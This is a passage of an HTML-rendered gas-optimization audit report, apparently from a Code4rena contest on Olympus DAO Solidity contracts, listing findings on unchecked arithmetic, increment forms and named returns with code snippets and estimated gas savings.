class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// Tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice     OHM token contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">     </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ohm</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ohmDecimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice     Reserve token contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">     </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveDecimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// Constants</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Status</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">OlympusPrice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">OlympusRange</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">OlympusTreasury</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">OlympusMinter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IBondAuctioneer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctioneer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IBondCallback</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">callback</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ohm</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ohmDecimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveDecimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FACTOR_SCALE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-08-expressions-that-cannot-be-overflowed-can-be-unchecked-5-instances\" style=\"position:relative;\"><a href=\"#g-08-expressions-that-cannot-be-overflowed-can-be-unchecked-5-instances\" aria-label=\"g 08 expressions that cannot be overflowed can be unchecked 5 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Expressions that cannot be overflowed can be unchecked (5 instances)</h2>\n<p>Deployment Gas Saved: <strong>23 016</strong></p>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300\">299-300</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310\">309-310</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">299</span><span class=\"mtk1\">        </span><span class=\"mtk12\">activePolicies</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">policy_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">        </span><span class=\"mtk12\">getPolicyIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">policy_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">activePolicies</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @note cannot be overflowed due to a previous push</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">309</span><span class=\"mtk1\">            </span><span class=\"mtk12\">moduleDependents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">keycode</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">policy_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">310</span><span class=\"mtk1\">            </span><span class=\"mtk12\">getDependentIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">keycode</span><span class=\"mtk1\">][</span><span class=\"mtk12\">policy_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">moduleDependents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">keycode</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @note cannot be overflowed due to a previous push</span></span></span></code></pre>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89\">89</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144\">144</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171\">171</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">reserveEthDecimals</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ohmEthDecimals</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note overflow is not possible, if an underflow occurs, the next statement will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">        </span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) % </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note numObs can not be equal 0 during to check in constructor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">updatedAt</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">observationFrequency</span><span class=\"mtk1\">)) </span><span class=\"mtk3\">// @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165</span></span></span></code></pre>\n<h2 id=\"g-09-increment-optimization-18-instances\" style=\"position:relative;\"><a href=\"#g-09-increment-optimization-18-instances\" aria-label=\"g 09 increment optimization 18 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Increment optimization (18 instances)</h2>\n<p>For a uint256 i variable, the following is true with the Optimizer enabled at 10k:</p>\n<p>Increment:</p>\n<p>i += 1 is the most expensive form<br>\ni++ costs 6 gas less than i += 1<br>\n++i costs 5 gas less than i++ (11 gas less than i += 1)<br></p>\n<p>Decrement:</p>\n<p>i -= 1 is the most expensive form<br>\ni— costs 11 gas less than i -= 1<br>\n--i costs 5 gas less than i— (16 gas less than i -= 1)<br></p>\n<h3 id=\"g-091--prefix-increments-are-cheaper-than-postfix-increments-especially-when-its-used-in-for-loops-3-instances\" style=\"position:relative;\"><a href=\"#g-091--prefix-increments-are-cheaper-than-postfix-increments-especially-when-its-used-in-for-loops-3-instances\" aria-label=\"g 091  prefix increments are cheaper than postfix increments especially when its used in for loops 3 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09.1]  Prefix increments are cheaper than postfix increments, especially when it’s used in for-loops (3 instances).</h3>\n<p>Deployment Gas Saved: <strong>400</strong></p>\n<ul>\n<li>src/utils/KernelUtils.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49\">49</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64\">64</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">            </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">            </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488\">488</a></li>\n</ul>\n<p>NOTE: in case of 670 675 686 691 not applicable and gas will be lost</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">488</span><span class=\"mtk1\">            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">++;</span></span></span></code></pre>\n<h3 id=\"g-092-x--x--1-even-more-efficient-than-pre-increment18-instances\" style=\"position:relative;\"><a href=\"#g-092-x--x--1-even-more-efficient-than-pre-increment18-instances\" aria-label=\"g 092 x  x  1 even more efficient than pre increment18 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09.2] <code>&#x3C;x> = &#x3C;x> + 1</code> even more efficient than pre increment.(18 instances)</h3>\n<p>Deployment Gas Saved: <strong>14 217</strong></p>\n<ul>\n<li>src/utils/KernelUtils.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49\">49</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64\">64</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">            </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">            </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488\">488</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670\">670</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675\">675</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686\">686</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691\">691</a></li>\n<li>*</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">488</span><span class=\"mtk1\">            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">670</span><span class=\"mtk1\">                </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">low</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">                </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">low</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">--;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">686</span><span class=\"mtk1\">                </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">high</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">691</span><span class=\"mtk1\">                </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">.</span><span class=\"mtk12\">high</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">--;</span></span></span></code></pre>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313\">313</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357\">357</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369\">369</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386\">386</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404\">404</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429\">429</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">313</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">386</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">404</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">429</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/modules/INSTR.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72\">72</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225\">225</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/BondCallback.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163\">163</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281\">281</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">step</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/TreasuryCustodian.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62\">62</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">                ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-10-use-named-returns-for-local-variables-where-it-is-possible-3-instances\" style=\"position:relative;\"><a href=\"#g-10-use-named-returns-for-local-variables-where-it-is-possible-3-instances\" aria-label=\"g 10 use named returns for local variables where it is possible 3 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Use named <code>returns</code> for local variables where it is possible (3 instances)</h2>\n<p>Deployment Gas Saved: <strong>5 400</strong></p>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135\">130-135</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Function to grab module address from a given keycode.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 